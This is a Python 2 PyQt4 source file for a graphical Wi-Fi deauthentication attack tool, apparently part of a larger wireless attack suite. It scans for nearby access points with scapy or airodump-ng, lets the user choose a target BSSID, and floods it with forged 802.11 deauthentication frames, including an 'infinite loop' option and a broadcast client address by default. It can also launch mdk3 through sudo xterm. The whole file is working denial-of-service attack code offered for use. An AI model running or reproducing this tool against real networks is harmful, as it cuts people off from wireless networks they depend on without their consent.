from PyQt4.QtGui import *
from PyQt4.QtCore import *
from subprocess import Popen,PIPE
from scapy.all import *
from Dns_Func import  frm_dhcp_Attack
import threading
from os import popen,system,getuid,path,makedirs
from re import search,compile,match
from Core.Settings import frm_Settings
from Modules.fuc_airodump import  airdump_start,get_network_scan
class frm_window(QMainWindow):
    def __init__(self, parent=None):
        super(frm_window, self).__init__(parent)
        self.form_widget = frm_deauth(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("Deauth Attack wireless Route")
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        if theme != "theme2":
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())
        else:
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            if getuid() == 0:
                system("airmon-ng stop mon0")
                system("clear")
                self.deleteLater()
            else:
                pass
        else:
            event.ignore()

class frm_deauth(QWidget):
    def __init__(self, parent=None):
        super(frm_deauth, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.interface = "mon0"
        self.xmlcheck = frm_Settings()
        self.ap_list = []
        self.pacote = []
        self.control = None
        self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
        self.window_qt()

    def select_target(self):
        item = self.tables.selectedItems()
        if item != []:
            self.linetarget.setText(item[2].text())
        else:
            QMessageBox.critical(self, "Error in row", "Nothing row in tables, please try scan network again")
            self.linetarget.clear()

    def window_qt(self):
        self.controlador = QLabel("")
        self.attack_OFF()
        self.form0 = QFormLayout()
        self.form1 = QFormLayout()
        self.form2 = QFormLayout()
        self.list = QListWidget()
        self.list.clicked.connect(self.list_clicked)
        self.list.setFixedHeight(20)

        self.tables = QTableWidget(5,3)
        self.tables.setFixedWidth(350)
        self.tables.setRowCount(100)
        self.tables.setFixedHeight(200)
        self.tables.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.tables.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tables.clicked.connect(self.select_target)
        self.tables.resizeColumnsToContents()
        self.tables.resizeRowsToContents()
        self.tables.horizontalHeader().resizeSection(1,120)
        self.tables.horizontalHeader().resizeSection(0,60)
        self.tables.horizontalHeader().resizeSection(2,158)
        self.tables.verticalHeader().setVisible(False)
        Headers = []
        for n, key in enumerate(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)


        self.linetarget = QLineEdit()
        self.input_client = QLineEdit(self)
        self.input_client.setText("FF:FF:FF:FF:FF:FF")
        self.btn_enviar = QPushButton("Send Attack", self)
        self.btn_enviar.clicked.connect(self.attack_deauth)
        self.btn_scan = QPushButton(" Network Scan ", self)
        self.btn_scan.clicked.connect(self.exec_sniff)
        self.btn_stop = QPushButton("Stop  Attack ", self)
        self.btn_stop.clicked.connect(self.kill_thread)
        self.btn_enviar.setFixedWidth(170)
        self.btn_stop.setFixedWidth(170)

        #icons
        self.btn_scan.setIcon(QIcon("rsc/network.png"))
        self.btn_enviar.setIcon(QIcon("rsc/start.png"))
        self.btn_stop.setIcon(QIcon("rsc/Stop.png"))

        self.w_pacote = QComboBox(self)
        self.w_pacote.addItem("1000 ")
        self.w_pacote.addItem("2000 ")
        self.w_pacote.addItem("3000 ")
        self.w_pacote.addItem("4000 ")
        self.w_pacote.addItem("5000 ")
        self.w_pacote.addItem("10000 ")
        self.w_pacote.addItem("infinite loop")
        self.time_scan = QComboBox(self)
        self.time_scan.addItem("10s")
        self.time_scan.addItem("20s")
        self.time_scan.addItem("30s")
        self.get_placa = QComboBox(self)
        Interfaces = frm_dhcp_Attack()
        n = Interfaces.placa()
        for i,j in enumerate(n):
            if search("wlan", j):
                self.get_placa.addItem(n[i])
        self.form0.addRow("Network scan time:", self.time_scan)
        self.form1.addRow(self.tables)
        self.form1.addRow(self.get_placa, self.btn_scan)
        self.form1.addRow("Target:", self.linetarget)
        self.form1.addRow("Packet:",self.w_pacote)
        self.form1.addRow("Client:", self.input_client)
        self.form1.addRow("Status Attack:", self.controlador)
        self.form2.addRow(self.btn_enviar, self.btn_stop)
        self.Main.addLayout(self.form0)
        self.Main.addLayout(self.form1)
        self.Main.addLayout(self.form2)
        self.setLayout(self.Main)
    def scan_diveces_airodump(self):
	dirpath = "Settings/Dump"
	if not path.isdir(dirpath):
	  makedirs(dirpath)
        self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
        exit_air = airdump_start()
        self.fix = False
        if exit_air == None:
            self.cap = get_network_scan()
            if self.cap != None:
                for i in self.cap:
                    i = i.split("||")
                    if self.check_is_mac(i[2]):
                        Headers = []
                        self.data['Channel'].append(i[0])
                        self.data['Essid'].append(i[1])
                        self.data['Bssid'].append(i[2])
                        for n, key in enumerate(self.data.keys()):
                            Headers.append(key)
                            for m, item in enumerate(self.data[key]):
                                item = QTableWidgetItem(item)
                                item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                                self.tables.setItem(m, n, item)
                    self.cap =[]
    def kill_thread(self):
        self.attack_OFF()
        self.control = 1
        dat = self.xmlcheck.xmlSettings("item1","deauth_mdk3",None,False)
        if dat == "True":
            popen("killall xterm")
    def exec_sniff(self):
        self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
        dot =1
        count = 0
        self.options_scan = self.xmlcheck.xmlSettings("monitor0", "scan_scapy", None, False)
        if self.get_placa.currentText() == "":
            QMessageBox.information(self, "Network Adapter", 'Network Adapter Not found try again.')
        else:
            comando = "ifconfig"
            proc = Popen(comando,stdout=PIPE, shell=False)
            data = proc.communicate()[0]
            if search("mon0", data):
                dot = 0
                c = "airmon-ng stop mon0".split()
                Popen(c,stdout=PIPE, shell=False)
                system("airmon-ng start %s" %(self.get_placa.currentText()))
            else:
                system("airmon-ng start %s" %(self.get_placa.currentText()))
            if self.time_scan.currentText() == "10s":
                count = 10
            elif self.time_scan.currentText() == "20s":
                count = 20
            elif self.time_scan.currentText() == "30s":
                count = 30
            if  self.options_scan == "True":
                sniff(iface=self.interface, prn =self.Scanner_devices, timeout=count)
                t = len(self.ap_list) -1
                i = 0
                items = []
                cap = []
                for i in range(t):
                    if len(self.ap_list[i]) < len(self.ap_list[i+1]):
                        if i != 0:
                            for index in xrange(self.list.count()):
                                items.append(self.list.item(index))
                            if self.ap_list[i] or self.ap_list[i+1] in items:
                                pass
                            else:
                                self.list.addItem(self.ap_list[i] + " " + self.ap_list[i+1])
                                if not (self.ap_list[i] + " " + self.ap_list[i+1]) in cap:
                                    cap.append(self.ap_list[i] + " " + self.ap_list[i+1])
                        else:
                            self.list.addItem(self.ap_list[i] + " " + self.ap_list[i+1])
                            if not (self.ap_list[i] + " " + self.ap_list[i+1]) in cap:
                                cap.append(self.ap_list[i] + " " + self.ap_list[i+1])
                    else:
                        self.list.addItem(self.ap_list[i+1] + " " + self.ap_list[i])
                        if not (self.ap_list[i+1] + " " + self.ap_list[i]) in cap:
                            cap.append(self.ap_list[i+1] + " " + self.ap_list[i])
                    if  self.ap_list[i] < i:
                        pass
                        break
                    else:
                        dot = 1
                self.list.clear()
                for i in cap:
                    dat = i.split()
                    if self.check_is_mac(dat[3]):
                        self.data['Channel'].append(dat[0])
                        self.data['Essid'].append(dat[2])
                        self.data['Bssid'].append(dat[3])
                        Headers = []
                        for n, key in enumerate(self.data.keys()):
                            Headers.append(key)
                            for m, item in enumerate(self.data[key]):
                                item = QTableWidgetItem(item)
                                item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                                self.tables.setItem(m, n, item)
                cap = []
                self.ap_list = []
            else:
                self.thread_airodump = threading.Thread(target=self.scan_diveces_airodump)
                self.thread_airodump.daemon = True
                self.thread_airodump.start()
    def Scanner_devices(self,pkt):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in self.ap_list:
                self.ap_list.append(pkt.addr2)
                self.ap_list.append(str(int(ord(pkt[Dot11Elt:3].info)))+" | " + pkt.info)
                print "AP MAC: %s with SSID: %s CH %d"%(pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info)))


    def attack_deauth(self):
        if self.linetarget.text() == "":
            QMessageBox.information(self, "Target Error", "Please, first select Target for attack")
        else:
            self.ss = None
            if self.w_pacote.currentText() == "infinite loop":
                self.ss = 1
            else:
                self.ss =  int(self.w_pacote.currentText())
            self.bssid = str(self.linetarget.text())
            self.deauth_check = self.xmlcheck.xmlSettings("item0", "deauth_scapy",None,False)
            self.args = self.xmlcheck.xmlSettings("mdk3","arguments", None, False)
            if self.deauth_check == "True":
                self.controlador.setText("[ ON ]")
                self.controlador.setStyleSheet("QLabel {  color : green; }")
                self.t = threading.Thread(target=self.deauth_attacker, args=(self.bssid,str(self.input_client.text()), self.ss))
                self.t.daemon = True
                self.t.start()
            else:
                self.controlador.setText("[ ON ]")
                self.controlador.setStyleSheet("QLabel {  color : green; }")
                self.t = threading.Thread(target=self.mdk3_attacker, args=(self.bssid,self.args,))
                self.t.daemon = True
                self.t.start()

    def attack_OFF(self):
        self.controlador.setText("[ OFF ]")
        self.controlador.setStyleSheet("QLabel {  color : red; }")
        system("clear")


    def mdk3_attacker(self,bssid,args):
        n  = (popen("""sudo xterm -geometry 75x15-1+200 -T "mdk3 Target: %s" -e mdk3 mon0 %s %s & mdk3=$!"""%(bssid,args,bssid)).read()) + "exit"
        while n != "dsa":
            if n == "exit":
                self.attack_OFF()
                break
    def deauth_attacker(self,bssid, client, count):
        self.control = None
        bot = 0
        conf.verb = 0
        conf.iface = self.interface
        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
        deauth_ap = Dot11(addr1=bssid, addr2=bssid, addr3=bssid)/Dot11Deauth()
        deauth_pkt2 = Dot11(addr1=bssid, addr2=client, addr3=client)/Dot11Deauth()
        self.pacote.append(deauth_pkt2)
        self.pacote.append(deauth_ap)
        if count == 1:
            while count != 0:
                try:
                    sendp(packet)
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
                    if self.control == None:
                        pass
                    else:
                        self.attack_OFF()
                        count = 0
                        popen("clear")
                except KeyboardInterrupt:
                    print "::"
                    sys.exit()
        else:
            for n in range(int(count)):
                try:
                    sendp(packet)
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
                    if self.control == None:
                        pass
                    else:
                        self.attack_OFF()
                        popen("clear")
                        break
                except KeyboardInterrupt:
                    print "::"
                    sys.exit()
            self.attack_OFF()

    def check_is_mac(self,value):
        checked = re.compile(r"""(
                             ^([0-9A-F]{2}[-]){5}([0-9A-F]{2})$
                            |^([0-9A-F]{2}[:]){5}([0-9A-F]{2})$
                         )""",
                         re.VERBOSE|re.IGNORECASE)
        if checked.match(value) is None:
            return False
        else:
            return True
    @pyqtSlot(QModelIndex)
    def list_clicked(self, index):
        itms = self.list.selectedIndexes()
        for i in itms:
            attack = str(i.data().toString()).split()
            for i in attack:
                if self.check_is_mac(i.replace(" ", "")):
                    self.linetarget.setText(str(i))
            if self.linetarget.text() == "":
                QMessageBox.information(self, "MacAddress", "Error check the Mac Target, please set the mac valid.")
